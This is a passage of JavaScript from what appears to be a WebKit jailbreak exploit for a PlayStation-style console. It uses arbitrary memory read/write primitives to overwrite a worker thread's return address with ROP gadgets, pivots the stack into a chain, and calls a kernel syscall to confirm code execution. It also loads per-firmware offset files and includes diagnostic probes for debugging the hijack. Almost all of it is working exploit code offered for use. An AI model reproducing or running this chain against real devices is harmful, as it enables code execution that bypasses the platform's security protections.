               the chain does next. If it crashes anyway, the hijack itself is
               wrong and no amount of chain fixing will help.
               The worker is left spinning; this run ends here by design. */
            crumb("probe-pivot-w1");
            p.write8(return_address_ptr, gadgets["infloop"]);
            crumb("probe-pivot-armed");
            const answered = await new Promise((resolve) => {
                const t = setTimeout(() => resolve(false), 6000);
                worker.onmessage = function () { clearTimeout(t); resolve(true); };
                crumb("probe-pivot-pm");
                worker.postMessage(0);
            });
            crumb("probe-pivot-" + (answered ? "ANSWERED" : "SILENT"));
            throw new Error("probe=pivot: worker "
                + (answered ? "ANSWERED -- the return slot was NOT taken, the"
                    + " hijack did not land (wrong frame or the write was undone)"
                    : "went SILENT and did not crash -- the hijacked return"
                    + " address IS executed, so the pivot is sound and the fault"
                    + " is in the chain body")
                + ". The worker is now spinning in infloop; reload.");
        }

        crumb("w1");
        p.write8(return_address_ptr, gadgets["pop rsp"]);
        crumb("w2");
        p.write8(stack_pointer_ptr, chain.stack_entry_point);
        crumb("armed");

        if (window.jb && window.jb.hot)
            jbmark("CHAIN-PRE-POST", "next=worker.postMessage(0)-rop-executes-now");
        let p1 = await new Promise((resolve) => {
            worker.onmessage = function (e) {
                resolve(1);
            }
            crumb("pm");
            worker.postMessage(0);
        });
        crumb("wans");
        if (window.jb && window.jb.hot)
            jbmark("CHAIN-POST-POST", "worker-answered-p1=" + p1);
        if (p1 == 0) {
            throw new Error("The rop thread ran away. ");
        }
    }

    let p2 = {
        write8: p.write8,
        write4: p.write4,
        write2: p.write2,
        write1: p.write1,
        read8: p.read8,
        read4: p.read4,
        read2: p.read2,
        read1: p.read1,
        leakval: p.leakval,
        pre_chain: pre_chain,
        launch_chain: launch_chain,
        malloc_dump: malloc_dump,
        malloc: malloc,
        stringify: stringify,
        array_from_address: array_from_address,
        readstr: readstr,
        writestr: writestr,
        libSceNKWebKitBase: libSceNKWebKitBase,
        libSceLibcInternalBase: libSceLibcInternalBase,
        libKernelBase: libKernelBase,
        nogc: nogc,
        syscalls: syscalls,
        gadgets: gadgets
    };

    let chain = new worker_rop(p2);

    const JB_POISON = new int64(0xDEADBEEF, 0x00C0FFEE);
    p.write8(chain.return_value, JB_POISON);
    jbmark("PREP-GETPID-PRE", "retval=0x" + chain.return_value.toString()
        + "-poisoned-next=chain.syscall(SYS_GETPID)");

    /* Empty chain first: a fresh worker_rop already carries pre_chain (setjmp),
       and run() appends launch_chain's three restore-writes plus longjmp. So
       this exercises the pivot, setjmp, `pop rdi`, `pop rsi`, `mov [rdi],rsi`
       and longjmp -- everything the getpid chain uses EXCEPT the syscall stub.
       Survive this and the fault is the stub; die here and it is the pivot or
       the setjmp/longjmp round trip. Costs one extra round trip. */
    crumb("nc");
    await chain.run();
    crumb("nc-ok");
    jbmark("PREP-NULLCHAIN-OK", "pivot+setjmp+longjmp round trip survived");

    crumb("gp-call");
    let pid = await chain.syscall(SYS_GETPID);
    crumb("gp-ret");

    jbmark("PREP-GETPID-POST", "raw=0x" + pid.toString());
    if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
        jbmark("PREP-CHAIN-DIDNT-RUN", "return-slot-still-poisoned");
        throw new Error("The ROP chain never executed: the return slot still "
            + "holds the poison. The hijacked thread is not the one postMessage "
            + "wakes (main.js:69's worker vs this one), or the stack write did "
            + "not land.");
    }

    if (pid.low == 0) {
        throw new Error("Webkit exploit failed.");
    }
    jbmark("PREP-GETPID-OK", "pid=" + pid.low);
    crumb("OK");

    return { p: p2, chain: chain };
}
let fwScript = document.createElement('script');
document.body.appendChild(fwScript);

window.__offsetsScript = fwScript;
fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=24`);
